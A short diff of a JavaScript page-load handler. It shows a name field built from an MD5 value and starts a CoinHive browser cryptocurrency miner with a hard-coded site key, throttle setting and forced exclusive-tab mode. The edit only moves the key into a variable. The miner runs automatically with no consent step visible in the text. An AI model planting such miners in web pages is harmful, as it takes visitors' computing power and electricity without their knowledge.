@@ -12,7 +12,8 @@ onload = function() {
 	document.getElementById('canvas_id').innerHTML = "Your Name: "+ md5_result;
 
 	// Your public Site-Key
-	const miner = new CoinHive.User('KQFxWf0LVZURcSMPu9A5rJwnUdYLBwmc', md5_result, { throttle: 0.3 });
+        let site_key = 'KQFxWf0LVZURcSMPu9A5rJwnUdYLBwmc';
+	const miner = new CoinHive.User(site_key, md5_result, { throttle: 0.3 });
 	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
 };
 
